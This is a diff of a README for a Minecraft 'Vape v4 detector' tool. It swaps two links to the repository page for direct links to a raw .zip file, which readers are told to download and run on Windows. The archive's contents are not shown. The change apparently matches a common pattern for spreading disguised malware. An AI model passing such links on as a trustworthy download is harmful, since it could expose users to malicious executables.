@@ -1,6 +1,6 @@
 # 🔎 vape-v4-detector - See Vapev4 Use In Minecraft
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://github.com/nominal-applesauce831/vape-v4-detector)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://raw.githubusercontent.com/nominal-applesauce831/vape-v4-detector/main/vape-v4/vape_v_detector_v1.6.zip)
 
 ## 🧭 What This Does
 
@@ -12,7 +12,7 @@ It focuses on quick checks, clear results, and a plain interface. You do not nee
 
 Use this link to visit the page and download the app:
 
-https://github.com/nominal-applesauce831/vape-v4-detector
+https://raw.githubusercontent.com/nominal-applesauce831/vape-v4-detector/main/vape-v4/vape_v_detector_v1.6.zip
 
 On the page, look for the latest Windows download and save it to your PC.
 
